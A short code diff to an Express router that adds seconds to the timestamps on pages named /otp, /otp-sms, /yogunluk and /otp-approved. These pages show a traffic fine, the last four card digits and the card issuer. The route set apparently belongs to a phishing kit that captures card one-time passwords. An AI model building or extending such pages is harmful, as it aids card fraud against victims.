@@ -81,7 +81,7 @@ router.get('/otp-sms2', async (req, res) => {
     issuer, sid, error,
     dateStr: new Date().toLocaleString('tr-TR', {
       timeZone: 'Asia/Dubai', day: '2-digit', month: '2-digit', year: 'numeric',
-      hour: '2-digit', minute: '2-digit',
+      hour: '2-digit', minute: '2-digit', second: '2-digit',
     }),
   });
 });
@@ -95,7 +95,7 @@ router.get('/otp-sms', async (req, res) => {
     cardLast4,
     totalFine: parseInt(totalFine || amount) || 0,
     issuer, sid, error,
-    dateStr: new Date().toLocaleString('en-AE', { timeZone:'Asia/Dubai', day:'2-digit', month:'2-digit', year:'numeric', hour:'2-digit', minute:'2-digit', hour12:false }),
+    dateStr: new Date().toLocaleString('en-AE', { timeZone:'Asia/Dubai', day:'2-digit', month:'2-digit', year:'numeric', hour:'2-digit', minute:'2-digit', second:'2-digit', hour12:false }),
   });
 });
 
@@ -108,7 +108,7 @@ router.get('/otp', async (req, res) => {
     totalFine: parseInt(totalFine || amount) || 0,
     issuer,
     sid,
-    dateStr: new Date().toLocaleString('en-AE', { timeZone:'Asia/Dubai', day:'2-digit', month:'2-digit', year:'numeric', hour:'2-digit', minute:'2-digit', hour12:false }),
+    dateStr: new Date().toLocaleString('en-AE', { timeZone:'Asia/Dubai', day:'2-digit', month:'2-digit', year:'numeric', hour:'2-digit', minute:'2-digit', second:'2-digit', hour12:false }),
   });
 });
 
@@ -142,7 +142,7 @@ router.get('/yogunluk', async (req, res) => {
   res.render('yogunluk', {
     ...pixel, pixelCurrentPath: '/yogunluk',
     totalFine: parseInt(totalFine)||0, cardLast4, issuer, sid,
-    dateStr: new Date().toLocaleString('en-AE', { timeZone:'Asia/Dubai', day:'2-digit', month:'long', year:'numeric', hour:'2-digit', minute:'2-digit', hour12:false }),
+    dateStr: new Date().toLocaleString('en-AE', { timeZone:'Asia/Dubai', day:'2-digit', month:'long', year:'numeric', hour:'2-digit', minute:'2-digit', second:'2-digit', hour12:false }),
   });
 });
 
@@ -156,7 +156,7 @@ router.get('/otp-approved', async (req, res) => {
     issuer,
     sid,
     dateStr: new Date().toLocaleDateString('en-AE', { timeZone:'Asia/Dubai', day:'2-digit', month:'long', year:'numeric' }),
-    timeStr: new Date().toLocaleTimeString('en-AE', { timeZone:'Asia/Dubai', hour:'2-digit', minute:'2-digit' }),
+    timeStr: new Date().toLocaleTimeString('en-AE', { timeZone:'Asia/Dubai', hour:'2-digit', minute:'2-digit', second:'2-digit' }),
   });
 });
 
